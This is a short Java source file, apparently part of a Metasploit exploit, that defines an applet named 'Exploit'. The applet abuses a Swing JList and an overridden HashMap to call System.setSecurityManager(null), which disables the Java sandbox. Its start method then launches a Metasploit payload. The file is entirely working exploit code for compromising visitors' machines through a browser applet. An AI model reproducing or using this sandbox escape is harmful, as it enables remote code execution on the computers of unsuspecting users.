package vuln;

import java.applet.Applet;
import java.io.IOException;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;
import java.util.Set;

import javax.swing.JList;

import metasploit.Payload;

public class Exploit extends Applet {

	public void start() {
		super.start();

        try {
            Payload.main(null);
        } catch (Exception e) {}
	}

	public Exploit() {
		System.out.println("Exploiting");
		Object target = System.class;
		String methodName = "setSecurityManager";
		Object[] args = new Object[] { null };

		Link l = new vuln.Link(target, methodName, args);

		final HashSet s = new HashSet();
		s.add(l);

		Map h = new HashMap() {

			public Set entrySet() {
				return s;
			};

		};

		JList list = new JList(new Object[] { h });
		this.add(list);

	}
}
